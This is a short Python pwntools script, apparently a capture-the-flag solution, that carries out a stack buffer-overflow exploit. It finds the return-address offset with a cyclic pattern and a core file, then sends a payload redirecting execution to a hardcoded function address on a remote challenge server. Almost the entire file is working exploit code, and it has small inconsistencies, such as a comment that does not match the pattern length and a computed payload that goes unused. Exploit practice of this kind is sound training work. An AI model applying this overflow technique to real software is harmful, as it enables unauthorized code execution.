#! /usr/bin/env python3

from pwn import *
from ptrlib import *

target_program = "./server"

elf = ELF(target_program)

p = process(target_program)

# https://docs.pwntools.com/en/stable/util/cyclic.html
# create 200 characters cyclic length
p.sendline(cyclic(80, n=8))
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.esp, 8), n=8)
print(f'offset = {offset}')
offset = offset - 4

func_address = "\x86\x85\x04\x08"
#print(hex(func_address))

payload = fit({
    offset: func_address
}, filler='A')

print(payload)

sock = Socket("thekidofarcrania.com", 4902)

payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9' + '\x86\x85\x04\x08'

sock.sendlineafter("Input some text:", payload)

while True:
        print(sock.recvline().decode("utf-8"))
